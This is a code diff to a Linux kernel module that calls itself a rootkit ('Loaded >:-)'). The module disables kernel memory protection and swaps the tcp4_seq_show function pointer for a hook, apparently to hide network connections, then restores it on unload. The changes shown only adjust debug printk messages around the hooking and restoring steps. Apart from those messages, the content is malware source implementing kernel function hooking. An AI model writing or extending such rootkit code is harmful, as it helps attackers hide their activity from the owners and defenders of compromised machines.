@@ -83,13 +83,15 @@ static int __init rootkit_init(void)
 	orig_tcp4_seq_show = (orig_tcp4_seq_show_t) __tcp4_seq_show;
 
 	printk(KERN_INFO "rootkit: Loaded >:-)\n");
-	printk(KERN_INFO "rootkit: found tcp4_seq_show at 0x%lx\n", __tcp4_seq_show);
+	printk(KERN_INFO "rootkit: found tcp4_seq_show at: 0x%lx\n", __tcp4_seq_show);
 
 	unprotect_memory();
 
 	/* Set __tcp4_seq_show to our hook */
-	printk(KERN_DEBUG "rootkit: hooking tcp4_seq_show... (0x%lx)\n", hook_tcp4_seq_show);
+	printk(KERN_DEBUG "rootkit: hooking tcp4_seq_show...\n");
 	__tcp4_seq_show = (unsigned long)hook_tcp4_seq_show;
+	printk(KERN_DEBUG "rootkit: (hook) __tcp4_seq_show = 0x%lx\n", __tcp4_seq_show);
+	printk(KERN_DEBUG "rootkit: (hook) *__tcp4_seq_show = 0x%lx\n", *__tcp4_seq_show);
 
 	protect_memory();
 
@@ -101,8 +103,10 @@ static void __exit rootkit_exit(void)
 	unprotect_memory();
 	
 	/* Set __tcp4_seq_show back to the saved original function */
-	printk(KERN_DEBUG "rootkit: restoring tcp4_seq_show... (0x%lx)\n", orig_tcp4_seq_show);
+	printk(KERN_DEBUG "rootkit: restoring tcp4_seq_show...\n");
 	__tcp4_seq_show = (unsigned long)orig_tcp4_seq_show;
+	printk(KERN_DEBUG "rootkit: (orig) __tcp4_seq_show = 0x%lx\n", __tcp4_seq_show);
+	printk(KERN_DEBUG "rootkit: (orig) *__tcp4_seq_show = 0x%lx\n", *__tcp4_seq_show);
 
 	protect_memory();
 	
